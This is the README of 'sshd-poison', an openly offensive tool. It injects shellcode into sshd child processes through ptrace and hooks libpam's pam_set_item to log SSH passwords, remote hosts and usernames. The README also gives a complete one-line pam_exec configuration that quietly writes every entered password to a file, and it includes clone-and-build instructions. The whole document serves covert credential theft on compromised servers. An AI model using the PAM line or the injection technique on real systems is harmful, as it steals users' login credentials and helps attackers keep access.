# sshd-poison

sshd-poison is a tool to get creds of pam based sshd authentication,
this is not the easiest way to do that (you can create a pam module, or just add
`auth optional pam_exec.so quiet expose_authtok /bin/bash -c {read,-r,x};{echo,-e,"`env`\n$x"}>>somefile`
in a service configuration), not even the stealthiest (the tool don't have any mechanism to try hide yourself,
and needs control the main sshd pid all the time), but code this gave me a lot of fun.

# How it works

The tool starts attaching the main sshd pid and wait for some events,
when a new process is created, it means that a new connection was started,
after that the tool will wait for an execve event,
then checks if the program executed is the same as the main pid,
to ensure a re-exec (this is why we need take control of the main pid,
every re-exec will erase any memory modification),
then a breakpoint are set in the entry point of the new process,
for wait the program load the shared librarys.
When it's done and the breakpoint has hit,
it are unset, the program will write the shellcode to a code cave, and the
GOT entry for pam_set_item, used by libpam, will be changed, to hook internal libpam call to pam_set_item function.

The log format are `password\0rhost\0user\0`.

This will only works with x86_64 PIE binaries, and kernel 3.4 or early (PTRACE_SEIZE),
I tested this with `OpenSSH_8.0p1, OpenSSL 1.1.1b  26 Feb 2019` with kernel `5.0.13-arch1-1-ARCH` and
`OpenSSH_7.9p1 Debian-10, OpenSSL 1.1.1b  26 Feb 2019` with kernel `4.19.0-kali3-amd64`


# Compiling

```
git clone --recurse-submodules https://github.com/hc0d3r/sshd-poison
cd sshd-poison
make
```

# Demo

![](https://raw.githubusercontent.com/hc0d3r/sshd-poison/media/Peek%2015-05-2019%2011-25.gif)
